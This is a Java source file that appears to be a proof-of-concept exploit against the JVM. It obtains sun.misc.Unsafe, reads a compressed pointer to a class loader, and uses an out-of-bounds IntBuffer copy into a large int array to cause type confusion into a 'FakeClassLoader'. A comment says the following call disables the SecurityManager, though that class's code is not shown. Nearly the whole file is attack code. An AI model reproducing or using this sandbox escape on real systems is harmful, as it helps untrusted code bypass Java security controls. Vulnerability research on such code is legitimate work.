package DisableSecurityManager;

import sun.misc.Unsafe;

import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.nio.IntBuffer;

import org.openjdk.jol.info.ClassLayout;
import org.openjdk.jol.vm.VM;


public class DisableSecurityManager {
  public static int emptyLen = 125000000;
  public static int targetLen = 1209098507;
  public static int offset = 999999999;
  public static int length = 2;
  public static int idx = 119999944;
  private static Unsafe unsafe;

  public static void main(String[] args) throws Throwable {
    ClassLoader cl = FakeClassLoader.class.getClassLoader();
    int classLoaderPointer = get_compressed_oop(cl);
    FakeClassLoader fcl =
        DisableSecurityManager.use_type_confusion_to_convert_to_fakeclassloader(classLoaderPointer);
    FakeClassLoader.doWork(fcl); //This will disable the security manager
  }


  public static void print_addresses(ClassLoader classLoader, int classLoaderPointer) {
    System.out.println("Address of classLoader: " + VM.current().addressOf(classLoader));
    System.out.println("classLoaderPointer: " + Integer.toHexString(classLoaderPointer) + " (" + classLoaderPointer + ")");
  }

  public static int get_compressed_oop(ClassLoader classLoader)
      throws IllegalAccessException, NoSuchFieldException {
    Field field = Unsafe.class.getDeclaredField("theUnsafe");
    field.setAccessible(true);
    unsafe = (Unsafe)field.get(null);
    ClassLoader[] helperArray = new ClassLoader[1];
    helperArray[0] = classLoader;
    long baseOffset = unsafe.arrayBaseOffset(ClassLoader[].class);
    int addressSize = unsafe.addressSize();
    return (int) unsafe.getLong(helperArray, baseOffset);
  }

  public static FakeClassLoader use_type_confusion_to_convert_to_fakeclassloader(int classLoaderPointer)
      throws Exception {
    int bytes = 400;
    ByteBuffer bb = ByteBuffer.allocateDirect(bytes);
    IntBuffer ib = bb.asIntBuffer();
    for (int i = 0; i < ib.limit(); i++) {
      ib.put(i, 0xBBBBBBBB);
    }
    for (int i = 0; i < ib.limit(); i++) {
      ib.put(i, classLoaderPointer);
    }

    FakeClassLoader[] fakeClassLoader = DisableSecurityManager.write_cl_from_IB_to_fcl(ib);

//    System.out.println("IB[0] memory address = " + VM.current().addressOf(ib.get(0)));

    return fakeClassLoader[idx];
  }

  public static FakeClassLoader[] write_cl_from_IB_to_fcl(IntBuffer ib) {
    //Make arrays
    FakeClassLoader[] fakeClassLoaderArray = new FakeClassLoader[DisableSecurityManager.emptyLen];
    int[] dst = new int[DisableSecurityManager.targetLen];

    // fill target arrays
    for (int i = 0; i < dst.length; i++) {
      dst[i] = 0xA2A2A2A2;
    }

//    System.out.println("newClassLoader memory address = " + VM.current().addressOf(newClassLoader));
//    System.out.println("DST memory address = " + VM.current().addressOf(dst));

    ib.get(dst, offset, length);

    return fakeClassLoaderArray;
  }


}


